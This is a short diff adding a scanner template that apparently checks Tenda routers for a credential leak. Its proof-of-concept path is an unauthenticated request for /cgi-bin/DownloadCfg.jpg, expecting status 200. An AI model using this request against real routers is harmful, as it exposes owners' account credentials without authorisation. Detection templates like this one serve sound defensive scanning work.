@@ -1,0 +1,3 @@
+name: "TendaT路由器账号密码泄露"
+poc: "/cgi-bin/DownloadCfg.jpg"
+status_code: 200
